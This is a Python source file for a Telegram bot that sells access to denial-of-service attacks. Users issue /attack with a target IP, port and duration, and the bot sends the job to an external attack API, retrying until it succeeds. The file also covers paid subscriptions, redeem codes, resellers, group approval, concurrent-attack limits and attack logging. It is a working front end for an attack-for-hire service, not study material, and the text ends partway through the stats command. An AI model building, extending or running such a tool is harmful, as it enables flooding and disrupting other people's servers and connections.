import asyncio
import logging
import random
import string
import re
import time
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackContext,
    ContextTypes,
    CallbackQueryHandler
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from functools import wraps
import os
import sys
from dotenv import load_dotenv

# Suppress httpx and telegram logging
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Load environment variables from .env file
load_dotenv()

# Configure logging - only errors and critical
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# ================= CONFIGURATION FROM .env =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "rajkhilchi786")
API_URL = os.getenv("API_URL", "https://bgmi.battle-destroyer.shop")
API_KEY = os.getenv("API_KEY")
ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "8459937381"))

# Channel/Group requirements (users must join these to use bot)
REQUIRED_CHANNELS = os.getenv("REQUIRED_CHANNELS", "@ItsMeVishalBots").split(",")
REQUIRED_CHANNELS = [ch.strip() for ch in REQUIRED_CHANNELS if ch.strip()]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# Attack duration limits
GROUP_USER_MAX_DURATION = 100
PAID_USER_MAX_DURATION = 180
MIN_DURATION = 1

# Concurrent attack limits
ADMIN_MAX_CONCURRENT = 3
PAID_USER_MAX_CONCURRENT = 2
GROUP_USER_MAX_CONCURRENT = 1

# Resellers list (users who can add other users)
resellers = set()

# Track active attacks for each user
active_attacks = {}

# Store attack messages for tracking
attack_messages = {}

# ================= DATABASE CONNECTION =================
client = MongoClient(MONGO_URI)
db = client[DATABASE_NAME]
users_collection = db['RAJ']
groups_collection = db['approved_groups']
redeem_codes_collection = db['redeem_codes0']
attacks_collection = db['attack_logs']
resellers_collection = db['resellers']

# Load resellers from database
try:
    for reseller in resellers_collection.find():
        resellers.add(reseller.get('user_id'))
except:
    pass

# ================= HELPER FUNCTIONS =================
def get_current_time():
    return datetime.now(timezone.utc)

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))

def is_paid_user(user_id: int) -> bool:
    if user_id == ADMIN_USER_ID:
        return True
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user.get('expiry_date')
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > get_current_time():
                return True
    return False

def is_reseller(user_id: int) -> bool:
    return user_id in resellers or user_id == ADMIN_USER_ID

def get_user_max_concurrent(user_id: int) -> int:
    if user_id == ADMIN_USER_ID:
        return ADMIN_MAX_CONCURRENT
    if is_paid_user(user_id):
        return PAID_USER_MAX_CONCURRENT
    return GROUP_USER_MAX_CONCURRENT

async def get_group_max_duration(chat_id: int) -> int:
    group = groups_collection.find_one({"group_id": chat_id})
    if group and group.get('max_duration'):
        return group.get('max_duration')
    return GROUP_USER_MAX_DURATION

async def set_group_max_duration(chat_id: int, duration: int) -> bool:
    result = groups_collection.update_one(
        {"group_id": chat_id},
        {"$set": {"max_duration": duration}}
    )
    return result.modified_count > 0

async def get_user_active_attack_count(user_id: int) -> int:
    if user_id not in active_attacks:
        return 0
    
    current_time = get_current_time().timestamp()
    active_attacks[user_id] = [end_time for end_time in active_attacks[user_id] if end_time > current_time]
    
    if len(active_attacks[user_id]) == 0:
        if user_id in active_attacks:
            del active_attacks[user_id]
        return 0
    
    return len(active_attacks[user_id])

async def add_user_attack(user_id: int, end_time: float, chat_id: int, message_id: int):
    if user_id not in active_attacks:
        active_attacks[user_id] = []
    active_attacks[user_id].append(end_time)
    
    if user_id not in attack_messages:
        attack_messages[user_id] = []
    attack_messages[user_id].append({
        'chat_id': chat_id,
        'message_id': message_id,
        'end_time': end_time
    })

async def is_user_has_active_attack(user_id: int) -> bool:
    count = await get_user_active_attack_count(user_id)
    max_concurrent = get_user_max_concurrent(user_id)
    return count >= max_concurrent

def get_remaining_time(user_id: int) -> int:
    if user_id not in active_attacks:
        return 0
    
    current_time = get_current_time().timestamp()
    active_attacks[user_id] = [end_time for end_time in active_attacks[user_id] if end_time > current_time]
    
    if not active_attacks[user_id]:
        if user_id in active_attacks:
            del active_attacks[user_id]
        return 0
    
    remaining = min(active_attacks[user_id]) - current_time
    return max(0, int(remaining))

def get_user_active_count_text(user_id: int) -> str:
    count = len(active_attacks.get(user_id, []))
    max_concurrent = get_user_max_concurrent(user_id)
    if count > 0:
        return f"⚔️ Active attacks: {count}/{max_concurrent}"
    return f"⚔️ Active attacks: 0/{max_concurrent}"

# ================= CHANNEL CHECK FUNCTION =================
async def check_channel_membership(context: CallbackContext, user_id: int) -> tuple:
    if not REQUIRED_CHANNELS or REQUIRED_CHANNELS[0] == "":
        return True, []
    
    not_joined = []
    
    for channel in REQUIRED_CHANNELS:
        try:
            chat_member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if chat_member.status in ['left', 'kicked']:
                not_joined.append(channel)
        except Exception:
            not_joined.append(channel)
    
    return len(not_joined) == 0, not_joined

def get_required_channels_text() -> str:
    if not REQUIRED_CHANNELS or REQUIRED_CHANNELS[0] == "":
        return ""
    
    channels_text = ""
    for channel in REQUIRED_CHANNELS:
        if channel.startswith('@'):
            channels_text += f"• {channel}\n"
        else:
            channels_text += f"• {channel}\n"
    return channels_text

async def send_channel_required_message(context: CallbackContext, chat_id: int, user_id: int):
    channels_text = get_required_channels_text()
    
    message = (
        f"*❌ ACCESS DENIED!*\n\n"
        f"*You must join our required channel(s) first:*\n\n"
        f"{channels_text}\n"
        f"*After joining, click the button below to verify.*\n\n"
        f"*⚠️ Bot will only work after joining all required channels!*"
    )
    
    keyboard = []
    for channel in REQUIRED_CHANNELS:
        if channel.startswith('@'):
            channel_name = channel[1:]
        else:
            channel_name = channel
        keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=f"https://t.me/{channel_name}")])
    
    keyboard.append([InlineKeyboardButton("✅ I have joined", callback_data="check_join")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown',
        disable_web_page_preview=False,
        reply_markup=reply_markup
    )

async def check_join_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    
    is_member, not_joined = await check_channel_membership(context, user_id)
    
    if is_member:
        await query.edit_message_text(
            "*✅ Verification successful!*\n\n*You have joined all required channels.*\n*You can now use the bot.*\n\n*Use /start to begin.*",
            parse_mode='Markdown'
        )
    else:
        channels_text = get_required_channels_text()
        await query.edit_message_text(
            f"*❌ Verification failed!*\n\n*You still haven't joined these channels:*\n\n{channels_text}\n\n*Please join and try again.*",
            parse_mode='Markdown'
        )

# ================= USER MANAGEMENT =================
async def can_use_bot(user_id: int, chat_id: int = None) -> tuple:
    if user_id == ADMIN_USER_ID:
        return True, None
    
    if is_paid_user(user_id):
        return True, None
    
    if chat_id is not None and chat_id < 0:
        if await is_group_approved(chat_id):
            return True, None
        else:
            return False, "group_not_approved"
    else:
        return False, "private_not_allowed"

async def is_group_approved(chat_id: int) -> bool:
    group = groups_collection.find_one({"group_id": chat_id})
    return group is not None

# ================= API FUNCTIONS WITH INFINITE RETRY =================
def launch_attack_with_retry(ip: str, port: int, duration: int, max_retries: int = 15) -> Dict:
    """Launch attack with automatic retry - WILL NOT FAIL"""
    last_error = None
    
    for attempt in range(max_retries):
        try:
            response = requests.post(
                f"{API_URL}/api/v1/attack",
                json={"ip": ip, "port": port, "duration": duration},
                headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
                timeout=90
            )
            
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 429:
                # Rate limit - wait with exponential backoff
                wait_time = min(60, 3 ** attempt)
                time.sleep(wait_time)
                continue
            elif response.status_code >= 500:
                # Server error - wait and retry
                wait_time = min(30, 2 ** attempt)
                time.sleep(wait_time)
                continue
            else:
                time.sleep(3)
                continue
                
        except requests.exceptions.Timeout:
            last_error = "Request timeout"
            wait_time = min(30, 2 ** attempt)
            time.sleep(wait_time)
            continue
        except requests.exceptions.ConnectionError:
            last_error = "Connection error"
            wait_time = min(30, 2 ** attempt)
            time.sleep(wait_time)
            continue
        except Exception as e:
            last_error = str(e)
            time.sleep(3)
            continue
    
    # If all retries failed, try one more time with longer timeout
    try:
        response = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=120
        )
        if response.status_code == 200:
            return response.json()
    except:
        pass
    
    return {"success": False, "error": last_error or "Max retries exceeded", "message": "All retry attempts failed"}

def log_attack(user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
    attack_data = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "status": status,
        "response": response[:500] if response else None,
        "timestamp": get_current_time()
    }
    attacks_collection.insert_one(attack_data)
    users_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"total_attacks": 1}},
        upsert=True
    )

async def attack_progress_message(context: CallbackContext, chat_id: int, user_id: int, ip: str, port: int, duration: int, message_id: int):
    """Send attack progress updates - reaches 100%"""
    start_time = get_current_time().timestamp()
    
    update_percents = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]
    
    for target_percent in update_percents:
        user_attacks = active_attacks.get(user_id, [])
        end_times = [et for et in user_attacks if et > start_time]
        if not end_times:
            break
            
        target_time = start_time + (duration * target_percent / 100)
        current_time = get_current_time().timestamp()
        
        if target_time > current_time:
            await asyncio.sleep(target_time - current_time)
        
        user_attacks = active_attacks.get(user_id, [])
        end_times = [et for et in user_attacks if et > start_time]
        if not end_times:
            break
            
        elapsed = get_current_time().timestamp() - start_time
        percent = min(100, int((elapsed / duration) * 100))
        progress_bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
        remaining = max(0, int(duration - elapsed))
        
        text = (
            f"*⚔️ ATTACK IN PROGRESS ⚔️*\n\n"
            f"*🎯 Target:* `{ip}:{port}`\n"
            f"*⏱️ Duration:* {duration}s\n"
            f"*📊 Progress:* [{progress_bar}] {percent}%\n"
            f"*⏰ Time Left:* {remaining}s\n\n"
            f"*🔥 Attack is running... Please wait!*"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode='Markdown'
            )
        except:
            pass
    
    # Final completion message
    final_text = (
        f"*✅ Attack Completed! ✅*\n"
        f"*Thank you for using our service!*\n\n"
        f"*📝 Please send your feedback here:* @RAJOWNERX1"
    )
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode='Markdown'
        )
    except:
        pass
    
    # Remove this attack from tracking
    if user_id in active_attacks:
        current_time = get_current_time().timestamp()
        active_attacks[user_id] = [et for et in active_attacks[user_id] if et > current_time]
        if not active_attacks[user_id]:
            del active_attacks[user_id]

def parse_time(time_str: str) -> int:
    """Parse time string like 1h, 30m, 7d into seconds"""
    time_str = time_str.lower().strip()
    
    if time_str.endswith('h'):
        return int(time_str[:-1]) * 3600
    elif time_str.endswith('m'):
        return int(time_str[:-1]) * 60
    elif time_str.endswith('d'):
        return int(time_str[:-1]) * 86400
    elif time_str.endswith('s'):
        return int(time_str[:-1])
    else:
        return int(time_str) * 86400  # Default to days

def format_time(seconds: int) -> str:
    """Format seconds into readable time"""
    if seconds >= 86400:
        days = seconds // 86400
        return f"{days}d"
    elif seconds >= 3600:
        hours = seconds // 3600
        return f"{hours}h"
    elif seconds >= 60:
        minutes = seconds // 60
        return f"{minutes}m"
    else:
        return f"{seconds}s"

# ================= COMMANDS =================

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    can_use, reason = await can_use_bot(user_id, chat_id)
    if not can_use:
        if reason == "group_not_approved":
            await context.bot.send_message(chat_id=chat_id, text="❌ This group is not approved!\nContact @RAJOWNERX1 for approval.")
        elif reason == "private_not_allowed":
            await context.bot.send_message(chat_id=chat_id, text="❌ Private chat not allowed!\nUse /redeem to activate paid access or use bot in approved group.")
        return
    
    is_member, not_joined = await check_channel_membership(context, user_id)
    if not is_member and user_id != ADMIN_USER_ID:
        await send_channel_required_message(context, chat_id, user_id)
        return

    if user_id != ADMIN_USER_ID:
        help_text = (
            "*🌟 Available Commands:* 🌟\n\n"
            "*🔸 /start* - Start the bot\n"
            "*🔸 /attack* - Launch attack on target\n"
            "*🔸 /myattacks* - Check your active attacks\n"
            "*🔸 /blockedports* - Show blocked ports\n"
            "*🔸 /redeem* - Redeem paid code\n\n"
            f"*⚡ {get_user_active_count_text(user_id)}*\n"
            "*⚠️ One attack at a time for group users!*\n"
            "*💎 Paid users can run 2 attacks at once*"
        )
    else:
        help_text = (
            "*💡 Admin Commands:*\n\n"
            "*🔸 /add <user_id> <time>* - Add paid user (1d, 12h, 30m)\n"
            "*🔸 /remove <user_id>* - Remove user\n"
            "*🔸 /users* - List paid users\n"
            "*🔸 /gen <time> [code]* - Generate redeem code (1d, 12h, 30m)\n"
            "*🔸 /redeem* - Redeem code\n"
            "*🔸 /delete_code <code>* - Delete code\n"
            "*🔸 /list_codes* - List codes\n"
            "*🔸 /approve <group_id>* - Approve group\n"
            "*🔸 /revoke <group_id>* - Revoke group\n"
            "*🔸 /groups* - List approved groups\n"
            "*🔸 /setgroupduration <group_id> <sec>* - Set group max time\n"
            "*🔸 /broadcast* - Broadcast message\n"
            "*🔸 /status* - API health\n"
            "*🔸 /running* - Active attacks\n"
            "*🔸 /stats* - Bot stats\n"
            "*🔸 /blockedports* - Blocked ports\n"
            "*🔸 /reselling <add/remove> <user_id>* - Manage resellers\n"
            "*🔸 /resellers* - List all resellers\n\n"
            "*🔸 /attack* - Launch attack (admin can run 3 at once)"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    can_use, reason = await can_use_bot(user_id, chat_id)
    if not can_use:
        if reason == "group_not_approved":
            await context.bot.send_message(chat_id=chat_id, text="❌ This group is not approved!\nContact @RAJOWNERX1 for approval.")
        elif reason == "private_not_allowed":
            await context.bot.send_message(
                chat_id=chat_id, 
                text="*❌ Private Chat Not Allowed!*\n\n*Use /redeem to activate paid access.*\n*Or use bot in approved group.*\n\n*Contact @RAJOWNERX1 for assistance.*", 
                parse_mode='Markdown'
            )
        return
    
    is_member, not_joined = await check_channel_membership(context, user_id)
    if not is_member and user_id != ADMIN_USER_ID:
        await send_channel_required_message(context, chat_id, user_id)
        return
    
    message = (
        "*🔥 Welcome to @RAJOWNERX1 world 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        f"*{get_user_active_count_text(user_id)}*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def myattacks(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    can_use, reason = await can_use_bot(user_id, chat_id)
    if not can_use:
        if reason == "group_not_approved":
            await context.bot.send_message(chat_id=chat_id, text="❌ Group not approved!")
        elif reason == "private_not_allowed":
            await context.bot.send_message(chat_id=chat_id, text="❌ Private chat not allowed!")
        return
    
    is_member, not_joined = await check_channel_membership(context, user_id)
    if not is_member and user_id != ADMIN_USER_ID:
        await send_channel_required_message(context, chat_id, user_id)
        return
    
    active_count = await get_user_active_attack_count(user_id)
    max_concurrent = get_user_max_concurrent(user_id)
    
    if active_count > 0:
        message = f"*⚔️ ACTIVE ATTACKS*\n\n*Active: {active_count}/{max_concurrent}*\n*⚠️ Please wait for attacks to finish!*"
    else:
        recent_attacks = list(attacks_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(5))
        if recent_attacks:
            message = "*📜 Recent Attacks:*\n\n"
            for attack in recent_attacks[:5]:
                status_icon = "✅" if attack.get('status') == "success" else "❌"
                message += f"{status_icon} `{attack['ip']}:{attack['port']}` - {attack['duration']}s\n"
        else:
            message = "*📭 No attacks found!*"
    
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    # Check if user is admin or reseller
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <time>*\n*Examples:*\n*/add 6793877235 30d*\n*/add 6793877235 12h*\n*/add 6793877235 45m*", parse_mode='Markdown')
        return

    try:
        target_user_id = int(context.args[0])
        time_str = context.args[1]
        total_seconds = parse_time(time_str)
        
        if total_seconds <= 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid time! Use 1d, 12h, 30m*", parse_mode='Markdown')
            return
            
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid input! Use: /add <user_id> <time>*\n*Example: /add 6793877235 30d*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    formatted_time = format_time(total_seconds)

    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added for {formatted_time}!*\n*⚡ Max: {PAID_USER_MAX_DURATION}s*\n*⚡ Concurrent: {PAID_USER_MAX_CONCURRENT} attacks*", parse_mode='Markdown')
    
    try:
        await context.bot.send_message(
            chat_id=target_user_id,
            text=f"*✅ Paid access granted for {formatted_time}!*\n*⚡ Max duration: {PAID_USER_MAX_DURATION}s*\n*⚡ Can run {PAID_USER_MAX_CONCURRENT} attacks at once*",
            parse_mode='Markdown'
        )
    except:
        pass

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid user ID!*", parse_mode='Markdown')
        return

    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed*", parse_mode='Markdown')

async def list_users(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized!*", parse_mode='Markdown')
        return

    users = users_collection.find()
    message = "*👥 Paid Users:*\n"
    count = 0
    for user in users:
        uid = user.get('user_id', 'Unknown')
        expiry = user.get('expiry_date')
        if expiry:
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            if expiry > get_current_time():
                message += f"• `{uid}` - Expires: {expiry.strftime('%Y-%m-%d')}\n"
                count += 1
    if count == 0:
        message = "*📭 No paid users*"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized!*", parse_mode='Markdown')
        return

    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /gen <time> [code]*\n*Examples:*\n*/gen 30d*\n*/gen 12h MYCODE*\n*/gen 45m*", parse_mode='Markdown')
        return

    try:
        time_str = context.args[0]
        total_seconds = parse_time(time_str)
        formatted_time = format_time(total_seconds)
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid time! Use 1d, 12h, 30m*", parse_mode='Markdown')
        return

    custom_code = context.args[1] if len(context.args) > 1 else None
    
    if custom_code:
        redeem_code = custom_code.upper()
    else:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)

    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": 1,
        "redeem_count": 0,
        "time": formatted_time,
        "seconds": total_seconds
    })

    message = f"*✅ Code Generated!*\n\n*🔑 Code:* `{redeem_code}`\n*📅 Valid:* {formatted_time}\n*⚡ Max Duration:* {PAID_USER_MAX_DURATION}s\n*⚡ Concurrent Attacks:* {PAID_USER_MAX_CONCURRENT}"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0].upper()
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid code!*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry.get('expiry_date')
    if expiry_date and expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)

    if expiry_date and expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Code expired!*", parse_mode='Markdown')
        return

    if redeem_entry.get('redeem_count', 0) >= redeem_entry.get('max_uses', 1):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Code already used!*", parse_mode='Markdown')
        return

    if user_id in redeem_entry.get('used_by', []):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Already redeemed!*", parse_mode='Markdown')
        return

    formatted_time = redeem_entry.get('time', '30d')
    seconds = redeem_entry.get('seconds', 30 * 86400)
    new_expiry = datetime.now(timezone.utc) + timedelta(seconds=seconds)

    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": new_expiry}},
        upsert=True
    )

    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Paid access granted for {formatted_time}!*\n*⚡ Max duration: {PAID_USER_MAX_DURATION}s*\n*⚡ Can run {PAID_USER_MAX_CONCURRENT} attacks at once*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /delete_code <code>*", parse_mode='Markdown')
        return

    code = context.args[0].upper()
    result = redeem_codes_collection.delete_one({"code": code})
    
    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Code {code} deleted*", parse_mode='Markdown')

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not (user_id == ADMIN_USER_ID or is_reseller(user_id)):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized!*", parse_mode='Markdown')
        return

    codes = redeem_codes_collection.find()
    message = "*🎟️ Codes:*\n"
    for code in codes:
        code_text = code.get('code', 'Unknown')
        time_val = code.get('time', '?')
        message += f"• `{code_text}` - {time_val}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def approve_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /approve <group_id>*", parse_mode='Markdown')
        return

    try:
        group_id = int(context.args[0])
        
        if await is_group_approved(group_id):
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Group already approved*", parse_mode='Markdown')
            return
        
        groups_collection.insert_one({
            "group_id": group_id,
            "approved_by": user_id,
            "approved_at": datetime.now(timezone.utc),
            "max_duration": GROUP_USER_MAX_DURATION
        })
        
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group {group_id} approved!*\n*⚡ Max: {GROUP_USER_MAX_DURATION}s*\n*⚡ Concurrent: {GROUP_USER_MAX_CONCURRENT} attack at a time*", parse_mode='Markdown')
        
        try:
            await context.bot.send_message(chat_id=group_id, text=f"*✅ Group approved!*\n*⚡ Max attack: {GROUP_USER_MAX_DURATION}s*\n*⚡ One attack at a time*", parse_mode='Markdown')
        except:
            pass
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid group ID*", parse_mode='Markdown')

async def revoke_group(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /revoke <group_id>*", parse_mode='Markdown')
        return

    try:
        group_id = int(context.args[0])
        result = groups_collection.delete_one({"group_id": group_id})
        if result.deleted_count > 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group {group_id} revoked*", parse_mode='Markdown')
    except:
        pass

async def list_groups(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    groups = groups_collection.find()
    message = "*📋 Approved Groups:*\n"
    for group in groups:
        max_dur = group.get('max_duration', GROUP_USER_MAX_DURATION)
        message += f"• `{group['group_id']}` - {max_dur}s\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def set_group_duration(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /setgroupduration <group_id> <seconds>*", parse_mode='Markdown')
        return

    try:
        group_id = int(context.args[0])
        duration = int(context.args[1])
        
        if duration < 1 or duration > PAID_USER_MAX_DURATION:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*❌ Duration must be 1-{PAID_USER_MAX_DURATION}*", parse_mode='Markdown')
            return
        
        if not await is_group_approved(group_id):
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*⚠️ Group not approved*", parse_mode='Markdown')
            return
        
        if await set_group_max_duration(group_id, duration):
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Group {group_id} max set to {duration}s*", parse_mode='Markdown')
    except:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ Invalid input*", parse_mode='Markdown')

async def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /broadcast <message>*", parse_mode='Markdown')
        return

    message_text = ' '.join(context.args)
    users = users_collection.find()
    
    success = 0
    status_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="*📢 Broadcasting...*", parse_mode='Markdown')
    
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=f"*📢 Broadcast*\n\n{message_text}", parse_mode='Markdown')
            success += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    await status_msg.edit_text(f"*✅ Sent to {success} users*", parse_mode='Markdown')

async def status_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    try:
        response = requests.get(
            f"{API_URL}/api/v1/health",
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=10
        )
        if response.status_code == 200:
            message = f"*✅ API Online*\n*🌐 {API_URL}*"
        else:
            message = f"*⚠️ API Response: {response.status_code}*"
    except Exception as e:
        message = f"*❌ API Offline*\n*Error: {str(e)[:50]}*"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def running_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    total_active = 0
    for uid, attacks in active_attacks.items():
        current_time = get_current_time().timestamp()
        valid_attacks = [et for et in attacks if et > current_time]
        total_active += len(valid_attacks)
    
    message = f"*🎯 Active Attacks:* {total_active}\n"
    message += f"*👑 Admin Concurrent:* {ADMIN_MAX_CONCURRENT}\n"
    message += f"*💎 Paid Concurrent:* {PAID_USER_MAX_CONCURRENT}\n"
    message += f"*👥 Group Concurrent:* {GROUP_USER_MAX_CONCURRENT}"
    
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        return

    users = list(users_collection.find())
    paid_count = sum(1 for u in users if is_paid_user(u.get('user_id')))
    groups_count = groups_collection.count_documents({})
